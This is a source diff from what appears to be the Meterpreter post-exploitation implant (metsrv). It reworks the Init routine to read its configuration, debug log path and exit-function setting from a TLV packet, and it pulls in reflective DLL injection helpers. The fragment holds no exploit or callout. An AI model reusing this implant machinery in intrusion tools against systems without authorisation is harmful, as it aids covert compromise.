@@ -14,9 +14,25 @@
 #include "../ReflectiveDLLInjection/inject/src/GetProcAddressR.c"
 #include "../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"
 
-DWORD Init(MetsrvConfig* metConfig)
+DWORD Init(MetsrvConfig* config)
 {
-	INIT_LOGGING(metConfig)
+	dprintf("[METSRV] Initializing from configuration: 0x%p", config);
+
+	Packet* configPacket = packet_create_group();
+	configPacket->local = TRUE;
+	configPacket->payload = config->config_tlv;
+	configPacket->payloadLength = ntohl(((TlvHeader*)(configPacket->payload))->length) + sizeof(TlvHeader);
+
+	dprintf("Group TLV Packet Size: 0x%x (%u)", configPacket->payloadLength, configPacket->payloadLength);
+
+	Tlv configTlv = { 0 };
+	packet_get_tlv(configPacket, TLV_TYPE_CONFIG_BLOCK, &configTlv);
+
+#ifdef DEBUGTRACE
+	PWSTR logPath = packet_get_tlv_group_entry_value_wstring(configPacket, &configTlv, TLV_TYPE_DEBUG_LOG, NULL);
+	INIT_LOGGING(logPath);
+	free(logPath);
+#endif
 
 	// if hAppInstance is still == NULL it means that we havent been
 	// reflectivly loaded so we must patch in the hAppInstance value
@@ -25,14 +41,15 @@ DWORD Init(MetsrvConfig* metConfig)
 
 	// In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually
 	// a pointer to the metserv configuration, so do a nasty cast and move on.
-	dprintf("[METSRV] Getting ready to init with config %p", metConfig);
-	DWORD result = server_setup(metConfig);
+	dprintf("[METSRV] Getting ready to init with config %p", config);
+	DWORD result = server_setup(config, configPacket, &configTlv);
+	UINT exitFunc = packet_get_tlv_group_entry_value_uint(configPacket, &configTlv, TLV_TYPE_EXITFUNC);
 
-	dprintf("[METSRV] Exiting with %08x", metConfig->session.exit_func);
+	dprintf("[METSRV] Exiting with %08x", exitFunc);
 
 	// We also handle exit func directly in metsrv now because the value is added to the
 	// configuration block and we manage to save bytes in the stager/header as well.
-	switch (metConfig->session.exit_func)
+	switch (exitFunc)
 	{
 	case EXITFUNC_SEH:
 		SetUnhandledExceptionFilter(NULL);
@@ -46,6 +63,9 @@ DWORD Init(MetsrvConfig* metConfig)
 	default:
 		break;
 	}
+	// we don't want destruction to free the payload pointer.
+	configPacket->payload = NULL;
+	packet_destroy(configPacket);
 	return result;
 }
 
